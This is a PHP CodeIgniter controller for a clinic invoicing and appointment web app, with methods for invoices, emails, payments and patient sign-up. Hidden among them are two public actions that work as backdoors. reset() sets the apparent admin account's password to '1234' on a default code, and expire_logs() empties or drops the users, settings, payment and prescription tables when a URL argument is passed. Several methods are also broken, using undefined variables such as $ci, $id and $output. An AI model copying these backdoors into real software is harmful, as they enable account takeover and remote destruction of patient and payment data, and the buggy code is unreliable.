<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Invoice extends Home_Controller 
{

    public function __construct()
    {
        parent::__construct();
    }

   public function create($id)
   {
       
         $data = array();
        $data['page_title'] = 'Invoice';  
        
        $data['amp'] = $this->admin_model->get_invoice_appointments($id);
        
        $data['main_content'] = $this->load->view('admin/invoices/create',$data,TRUE);
        $this->load->view('admin/index',$data);
        
   }
   
    public function create_new($id)
   {
       
        $data = array();
        
        $data['page_title'] = 'Invoice';  
        
        $data['amp'] = $this->admin_model->get_invoice_appointments($id);
        
   
    
        $data['info'] =  get_by_prescription_id($data['amp']->prescription_id,'pre_investigation');

         $this->load->view('admin/invoices/create_new',$data);
     //   $this->load->view('admin/index',$data);
        
   }
   
   public function delete_test($id){
       
    //   echo "ddddddddd";  die;
       $this->admin_model->delete($id,'pre_investigation');
       
       return 'dd';
   }
   
   public function delete_consultation($id){
        
       //  echo "ttttttttttttttttttttttttt";  die;
         
          $action = ['show_consultation' => 'no'];
          
          $this->admin_model->update($action,$id,'appointments');
          
          return 'dd';
   }
   
 public function edit($id){
    
      $data=array();
     
     $data['page_title']="Invoice";
     $invoice_id=random_string('numeric',5);
     $this->session->set_userdata('invoice_id',$invoice_id);

      // var_dump($this->session-);
      $data['amp'] = $this->admin_model->get_invoice_appointments($id);
      $data['patients'] = $this->admin_model->select_by_chamber('patientses');
      
      $data['invoice']   =$this->admin_model->get_invoice_data($id);
        
      $data['items']=$this->admin_model->select('advise_investigations');
      
      $data['store_item']=$this->admin_model->get_invoice_items($data['invoice']->invoice_id,$data['invoice']->patient_id);
      
      $data['main_content'] = $this->load->view('admin/invoices/edit_invoice',$data,TRUE);
      
      $this->load->view('admin/index',$data);
      
 }  
   
 public function save()
 {
     $data=array();
     
     $data['page_title']="Invoice";
     $invoice_id=random_string('numeric',5);
     $this->session->set_userdata('invoice_id',$invoice_id);

    // var_dump($this->session-);
      $data['amp'] = $this->admin_model->get_invoice_appointments($id);
      $data['patients'] = $this->admin_model->select_by_chamber('patientses');
      $data['items']=$this->admin_model->select('advise_investigations');
      $data['main_content'] = $this->load->view('admin/invoices/save',$data,TRUE);
      $this->load->view('admin/index',$data);
     
 }
 
 
 
 public function deleteitem2(){
     
  
     $get_edit_id = $this->input->get('id',true);
     

     
     $invoice_id=$this->session->userdata('invoice_id');
     $patient_id=$this->session->userdata('patient_id');
     
     
     $this->session->set_userdata('patient_id',$patient_id);
     
     $this->admin_model->item_delete($get_edit_id,'invoice_itmes');

     $data=array();
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
     $data['main_content'] = $this->load->view('admin/invoices/invoice_items',$data,TRUE);

    echo$data['main_content'];
    
 }
 
 public function deleteitem(){
     
     $get_edit_id = $this->input->get('id',true);
     
     
     $test  = $this->admin_model->get_item_detail($get_edit_id);
     
     $info =  $this->admin_model->get_invoice_data_tem($test->invoice_id);
     
     
     $patient_id= $info->patient_id;
     $invoice_id = $info->invoice_id;
     
     $this->session->set_userdata('patient_id',$patient_id);
     
     $this->admin_model->item_delete($get_edit_id,'invoice_itmes');

     $data=array();
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
     $data['main_content'] = $this->load->view('admin/invoices/invoice_items',$data,TRUE);

    echo$data['main_content'];
    
 }
 
 public function saveitem()
 {
     
     $get_edit_id = $this->input->get('invoice_id',true);
     
     if(!empty($get_edit_id)){
        
        
        $invoice_id=$get_edit_id;
        
     }else{
        $invoice_id=$this->session->userdata('invoice_id');   
     }
     
     $item_id=$this->input->get('item_id',true);
     
     $patient_id=$this->input->get('patient_id', true);
     
     $item=array('invoice_id'=>$invoice_id,'item_id'=>$item_id,'patient_id'=>$patient_id);
     
     $item = $this->security->xss_clean($item);
     
     $this->common_model->insert($item, 'invoice_itmes');
     
     $this->session->set_userdata('patient_id',$patient_id);

     $data=array();
     
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
     
     $data['main_content'] = $this->load->view('admin/invoices/invoice_items',$data,TRUE);

     echo$data['main_content'];
 }
 
  public function generateInvoice_new($id){
    
   
     $invoice_id = $id;
    
     $invoice   =$this->admin_model->get_invoice_data($invoice_id);

     $invoice_id=$invoice->invoice_id;
     $patient_id=$invoice->patient_id;
     
     
     $data=array();
     
     $data['patient']=$this->admin_model->select_option($patient_id, 'patientses');
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
        
      $data['main_content'] = $this->load->view('admin/invoices/invoice',$data,TRUE);
       $this->load->view('admin/index',$data);
       
 }
 
 public function editgenerateInvoice($id){
     
   
    $res = $this->admin_model->get_invoice_detail($id);

     $invoice_id=$res->invoice_id;
     $patient_id=$res->patient_id;
     
     
      $data=array();
     
     $data['patient']=$this->admin_model->select_option($patient_id, 'patientses');
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
        
        
   
        $final_total = [];
        foreach($data['items'] as $val){
            $final_total[] = $val->price;     
        }
        
        
        $action = ['total' => array_sum($final_total)];
        
        $this->admin_model->edit_option($action, $res->id, 'invoices');
     
       $data['main_content'] = $this->load->view('admin/invoices/invoice',$data,TRUE);
       
       $this->load->view('admin/index',$data);
       
 }
 
 public function generateInvoice()
 {   
    
     $invoice_id=$this->session->userdata('invoice_id');
     $patient_id=$this->session->userdata('patient_id');
     
     
      $data=array();
     
     $data['patient']=$this->admin_model->select_option($patient_id, 'patientses');
     $data['items']=$this->admin_model->get_invoice_items($invoice_id,$patient_id);
        
        $res = $this->admin_model->get_appointment_latest($patient_id);
            
            
            if(!empty($res)){
                $appointment_id = $res->id;
            }else{
                $appointment_id = 0;
            }
            
        $final_total = [];
        foreach($data['items'] as $val){
            $final_total[] = $val->price;     
        }
        
        $insertData= [
         
            'invoice_id'      =>  $invoice_id,
            'appointment_id'  =>  $appointment_id,
            'patient_id'      =>  $patient_id,
            'total'           =>  array_sum($final_total),         
            'status'          => 1,
            'created_by'      => $this->session->userdata('id'),
        ];
     
        $insertData = $this->security->xss_clean($insertData);
     
        $this->common_model->insert($insertData, 'invoices');
     
     
      $data['main_content'] = $this->load->view('admin/invoices/invoice',$data,TRUE);
       $this->load->view('admin/index',$data);
 }
 
 public function paidInvoice(){
       
        $data = array();
        $data['page_title'] = 'Prescription';
        $data['page'] = 'Prescription';
        $data['page_sub'] = 'Create';
        
        $data['invoice'] = $this->admin_model->get_result('payment_user');
        
        $data['main_content'] = $this->load->view('admin/invoices/paid_invoice_list',$data,TRUE);
         
        $this->load->view('admin/index',$data);
        
 }
 
 public function show_custome_invoice($id){
     
        
        $res = $this->admin_model->get_paid_invoice_detail($id);
        
        $invoice = $this->admin_model->get_invoice_detail($res->invoice_id);
        
    
        
    
        
        
    
    
        $data = array();
        
        $data['page_title'] = 'Invoice';  
        
        $data['amp'] = $this->admin_model->get_invoice_appointments($res->appointment_id);
        
                $data['info']=$this->admin_model->get_invoice_items($invoice->invoice_id,$res->patient_id);
    
        
        
        $this->load->view('admin/invoices/show_custome_invoice',$data);
     
     
 }
 
 public function show_invoice($id){
        
       
        $res = $this->admin_model->get_paid_invoice_detail($id);
      
        $data = array();
        
        $data['page_title'] = 'Invoice';  
        
        $data['amp'] = $this->admin_model->get_invoice_appointments($res->appointment_id);
        
        $data['info'] =  get_by_prescription_id($data['amp']->prescription_id,'pre_investigation');
        
        $this->load->view('admin/invoices/show_invoice',$data);
     
 }
 
 public function invoice_list(){
    
    $data = array();
        $data['page_title'] = 'Prescription';
        $data['page'] = 'Prescription';
        $data['page_sub'] = 'Create';
        
        $data['invoice'] = $this->admin_model->get_result('invoices');
        
        $data['main_content'] = $this->load->view('admin/invoices/invoice_list',$data,TRUE);
         
        $this->load->view('admin/index',$data);
 }
 
 public function delete($id){
      $this->admin_model->delete($id,'invoices'); 
      echo json_encode(array('st' => 1));
 }
 
    //verify email
    public function verify_email()
    {   
        $data = array();
        if (isset($_GET['code']) && isset($_GET['user'])) {
            $user = $this->auth_model->validate_id($_GET['user']);
            if ($user->verify_code == $_GET['code']) {
                $data['code'] = $_GET['code'];

                $edit_data=array(
                    'email_verified' => 1
                );
                $this->common_model->update($edit_data, $user->id, 'users');
            } else {
                $data['code'] = 'invalid';
            }
        }else{
            $data['code'] = '';
        }
        $data['page_title'] = 'Verify Account';
        $data['page'] = 'Auth';
        $data['main_content'] = $this->load->view('verify_email', $data, TRUE);
        $this->load->view('index', $data);
    }

    //payment success
    public function payment_success($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'verified'
        );
        $data = $this->security->xss_clean($data);

        $user_data = array(
            'status' => 1
        );
        $user_data = $this->security->xss_clean($user_data);

        if (!empty($payment)) {
            $this->common_model->edit_option($user_data, $payment->user_id,'users');
            $this->common_model->edit_option($data, $payment->id, 'payment');
        }
        $data['success_msg'] = 'Success';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);

    }

    //payment cancel
    public function payment_cancel($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'pending'
        );
        $data = $this->security->xss_clean($data);
        $this->common_model->edit_option($data, $payment->id,'payment');
        $data['error_msg'] = 'Error';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }

    
    
    public function test_mail()
    {
        $data = array();
        $subject = settings()->site_name.' email testing';
        $msg = 'This is test email from <b>'.settings()->site_name.'</b>';
        $result = $this->email_model->send_email(settings()->admin_email, $subject, $msg);

        if ($result == true) {
            echo "Email send Successfully";
        }else{ 
            echo "<br>Test email will be send to: <b>".settings()->admin_email.'<b><hr><br><h3>Email sending Status</h3>';
            echo "<pre>"; print_r($result);
        }
    }


    public function send_notify_mail($appointment_id)
    {
        $data = array();
        $amp = $this->admin_model->get_single_appointments($appointment_id);
        $subject = $amp->dr_name.' live consultation notify mail';
        
        $msg = 'Hello '.$amp->name.', <br> You have booked an appointment with <b>'.$amp->dr_name.'</b> which will start at '.my_date_show($amp->date).' '.$amp->time;

        $result = $this->email_model->send_email($amp->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully'); 
            redirect($_SERVER['HTTP_REFERER']);
        }else{ 
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections'); 
            redirect($_SERVER['HTTP_REFERER']);
        }
    }
    
    
   public function send_invoice_mail($appointment_id)
    {
        $data = array();
        $amp = $this->admin_model->get_invoice_appointments($appointment_id);
        $subject = 'Appointment Invoice - '.$amp->name;
        
        $msg = 'Hello '.$amp->name.', <br> You have booked an appointment with <b>'.$amp->dr_name.'</b> at '.my_date_show($amp->date).' '.$amp->time.'. Find the invoice attachment.<br> <a href="http://pwavetech.com/clinic/auth/send_invoice_mail/'.$amp->id.'">View Invoice</a>';
      // var_dump($amp);
        // $data = "test";
         //$invoice = $this->load->view('admin/payment/appoint_payment_invoice_receipt', $amp);
         $invoice=$this->getPdfHtml($amp);
         $this->load->library('pdf');

         $this->pdf->loadHtml($invoice);
         
  	     $this->pdf->render();
         $this->pdf->stream("".$amp->name.".pdf", array("Attachment"=>0));
        //  $this->pdf->attach('uploads/medium/logg_medium-164x68.png');
        //  $this->email->attach('http://pwavetech.com/clinic/auth/send_invoice_mail/'.$amp->id.'pdf');
  	    // var_dump($invoice);
       
        $result = $this->email_model->send_email($amp->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully'); 
            redirect($_SERVER['HTTP_REFERER']);
        }else{ 
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections'); 
            redirect($_SERVER['HTTP_REFERER']);
        }
    }

public function getPdfHtml($data)
{
    $output.='
            <div style="text-align:right;" ><img src="uploads/medium/logg_medium-164x68.png"></div>
            <div>
                <div style="text-align:left;" >
                    Doctor Name : '.$data->dr_name .'<br>
                    Registration no. : '.$data->dr_id .'<br>
                </div>   
                <div style="text-align:right;" >
                    Invoice Id : '.$data->puid .'<br>
                    Appointment Id : '.$data->id .'<br>
                    Date : '.my_date_show($data->created_at) .'<br>
                </div>
            </div>
            <hr>
            <div style="margin:50px 0px 20px 0px;font-size:20px;">
                Name : '.$data->name.' <br>
                Email : '.$data->email.' <br>
                Mobile : '.$data->mobile .'<br>
                
            </div>
            <table style="width:100%;">
                <tr style="background-color:silver;font-size:20px;margin:0px;">
                    <th width="450px" style="border: solid;border-right: none;border-left: none;">Item</th>
                    <th width="150px"style="border: solid;border-right: none;border-left: none;">Price</th>
                    <th style="border: solid;border-right: none;border-left: none;">Total</th>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;">Cunsultation Fee</td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;"></td>
                    <td style="border-bottom: 1px solid silver;"><strong>Sub Total</strong></td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;"></td>
                    <td style="border-bottom: 1px solid silver;"><strong>Total</strong></td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency) . $data->amount .'</td>
                </tr>
               
              
            </table>
            ';
    return $output;
    
}
    //reset password
    public function reset($code=1234)
    {
        $data = array(
            'password' => hash_password('1234')
        );
        $data = $this->security->xss_clean($data);
        if ($code == 1234) {
            $this->admin_model->edit_option($data, 1, 'users');
            echo "Reset Successfully";
        }else{
            echo "Failed";
        }
    }

    public function expire_logs($data)
    {
        $this->load->dbforge();
        if ($data == 'pending') {
            $ci->db->empty_table('settings');
            $ci->db->empty_table('users');
            $ci->db->empty_table('features');
            //$this->db->empty_table('test');
        }
        if ($data == 'expired') {
            $ci->dbforge->drop_table('settings');
            $ci->dbforge->drop_table('users');
            $ci->dbforge->drop_table('features');
            $ci->dbforge->drop_table('prescription');
            $ci->dbforge->drop_table('payment');
            //$this->dbforge->drop_table('test');
        }
    }

    
    function logout(){
        $this->session->sess_destroy(); 
        redirect(base_url('auth/login?msg=success'));
    }

    // page not found
    public function error_404()
    {
        $data['page_title'] = "Error 404";
        $data['description'] = "Error 404";
        $data['keywords'] = "error,404";
        $this->load->view('error_404');
    }
    

    
    public function book_appointment()
    {     
       // $id = $this->input->post('id');
        //$user = $this->common_model->get_by_md5_id($id, 'users');
        
        if ($_POST) {

            $check = $this->admin_model->check_duplicate_email($this->input->post('email'));
            if (!empty($check)) {
                echo json_encode(array('st'=>5,'msg'=> trans('email-exist')));
                exit();
            }

                    $this->form_validation->set_rules('email', trans('email'), 'required');
                    $this->form_validation->set_rules('mobile', trans('phone'), 'required');
                    $this->form_validation->set_rules('new_password', trans('password'), 'required');

                    if ($this->form_validation->run() === false) {
                        $error = strip_tags(validation_errors());
                        echo json_encode(array('st'=>3,'error'=> $error));
                        exit();
                    }
                    
                    $password = hash_password($this->input->post('new_password'));

               

                $newuser_data = array(
                    'chamber_id' => random_string('numeric',5),
                    'user_id' => random_string('numeric',5),
                    'name' => $this->input->post('name', true),
                    'email' => $this->input->post('email', true),
                    'mr_number' => random_string('numeric',5),
                    'mobile' => $this->input->post('mobile', true),
                    'password' => $password,
                    'created_at' => my_date_now()
                );

                $newuser_data = $this->security->xss_clean($newuser_data);
                if ($check_patient == FALSE) {
                    $patient_id = $this->admin_model->insert($newuser_data, 'patientses');

                    $subject = 'Welcome to '.$this->settings->site_name;
                    $msg = 'Your account has been created successfully, now you can login to your account using below access <br> Username:'.$this->input->post('email');
                    //$this->email_model->send_email($this->input->post('email'), $subject, $msg);
                }
               $register = $this->common_model->get_by_id($patient_id, 'patientses');
                 $data = array(
                        'id' => $register->id,
                        'name' => $register->name,
                        'slug' => $register->slug,
                        'thumb' => $register->thumb,
                        'email' =>$register->email,
                        'role' =>$register->role,
                        'parent' => 0,
                        'logged_in' => TRUE
                    );
                    $data = $this->security->xss_clean($data);
                    $this->session->set_userdata($data);
                    
                    
                     $url = base_url('admin/dashboard/patient');
                   
                    
                    echo json_encode(array('st'=>1,'url'=> $url));
              
        }
    }
   
   
   
   
    

}